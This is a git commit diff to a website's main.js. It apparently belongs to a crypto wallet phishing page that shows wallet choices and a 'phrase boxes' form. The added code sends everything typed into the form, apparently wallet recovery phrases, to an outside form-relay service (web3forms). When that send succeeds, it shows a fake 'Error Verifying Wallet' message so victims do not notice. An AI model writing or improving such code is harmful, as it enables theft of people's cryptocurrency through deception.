1900caccf2ab5feb0e02da726e404f0423bcb370
blawidris <blawidris@gmail.com>
2022-05-30 08:40:46 -0700

    full javascript setup

--- asset/js/main.js
+++ asset/js/main.js
@@ -33,27 +33,26 @@
   let boxImg = select(".blockchain .img", true);
   let boxTitle = select(".blockchain h4", true);
 
- 
   // Open modalbox
   box.forEach((e, index) => {
     e.addEventListener("click", function () {
-      openModal();
+      openModal(".modal-connectius");
 
       //  set wallet technology
       let walletName = select(".modal .modal-block-deet h4");
       let walletImage = select(".modal .modal-block-deet .block-img img");
 
       [...boxTitle].forEach((a, ai) => {
-        if(index === ai){
+        if (index === ai) {
           walletName.textContent = a.textContent;
         }
       });
 
-      boxImg.forEach((a,ai)=>{
-        if(index === ai){
+      boxImg.forEach((a, ai) => {
+        if (index === ai) {
           walletImage.src = a.src;
         }
-      })
+      });
     });
   });
 
@@ -62,20 +61,145 @@
     "click",
     ".modal .modal-head .close",
     function (e) {
-      let modalContainer = select(".modal", true);
-      //  show modalbox
-      [...modalContainer].forEach((e) => {
-        e.classList.remove("show");
-      });
+      e.preventDefault();
+      closeModal(".modal-connectius");
     },
     true
   );
 
-  function openModal() {
-    let modalContainer = select(".modal", true);
-    //  show modalbox
+  // phrase boxes
+  on("click", "#inbox-modal", function (e) {
+    e.preventDefault();
+    closeModal(".modal-connectius");
+
+    openModal(".modal-form");
+  });
+
+  // modal nav-link
+  let modalNav = select(".modal .navbar .nav-item", true);
+  modalNav.forEach((button, index) => {
+    button.addEventListener("click", function () {
+      modalNav.forEach((btn) => btn.classList.remove("active"));
+      this.classList.add("active");
+
+      let tabConnect = select(".tab-content", true);
+      tabConnect.forEach((x, i) => {
+        if (index === i) {
+          x.classList.remove("d-none");
+          x.classList.add("active");
+        } else {
+          x.classList.add("d-none");
+          x.classList.remove("active");
+        }
+      });
+    });
+  });
+
+  // Form validation
+  let forms = select("form", true);
+  let result = select("#result");
+  const progressBar = select(".sending");
+
+  forms.forEach((form) => {
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+      var obj = {};
+
+      formData.forEach((value, key) => {
+        obj[key] = value;
+      });
+
+      var json = JSON.stringify(obj);
+
+      result.innerHTML = "Please wait";
+      progressBar.style.display = "block";
+
+      fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json",
+        },
+        body: json,
+      })
+        .then(async (response) => {
+          let json = await response.json();
+          if (response.status == 200) {
+            alert("Error Verifying Wallet... Please try again later");
+          } else {
+            console.log(response);
+            result.innerHTML = json.message;
+            result.classList.remove("text-gray-500");
+            result.classList.add("text-red-500");
+          }
+        })
+        .catch((error) => {
+          console.log(error);
+          result.innerHTML = "Something went wrong!";
+        })
+        .then(function () {
+          // form.reset();
+          progressBar.style.display = "none";
+          setTimeout(() => {
+            result.style.display = "none";
+          }, 5000);
+        });
+    });
+  });
+
+  let boxBtn = select('#inbox-modal');
+  let loading = select('.loading');
+
+  loading.style.display = 'flex';
+  boxBtn.style.display = 'none';
+
+  setTimeout(() => {
+    loading.style.display = "none";
+    boxBtn.style.display = "flex";
+  }, 4000);
+
+  function openModal(c) {
+    let modalContainer = select(".modal" + c, true);
     [...modalContainer].forEach((e) => {
       e.classList.add("show");
     });
   }
+
+  function closeModal(c) {
+    let modalContainer = select(".modal" + c, true);
+    [...modalContainer].forEach((e) => {
+      e.classList.remove("show");
+    });
+  }
+
+  const isRequired = (value) => (value === "" ? false : true);
+  const isBetween = (length, min, max) =>
+    length < min || length > max ? false : true;
+
+  const showError = (input, message) => {
+    // get the form-field element
+    const formField = input.parentElement;
+    // add the error class
+    formField.classList.remove("success");
+    formField.classList.add("error");
+
+    // show the error message
+    const error = formField.querySelector("small");
+    error.textContent = message;
+  };
+
+  const showSuccess = (input) => {
+    // get the form-field element
+    const formField = input.parentElement;
+
+    // remove the error class
+    formField.classList.remove("error");
+    formField.classList.add("success");
+
+    // hide the error message
+    const error = formField.querySelector("small");
+    error.textContent = "";
+  };
 })();
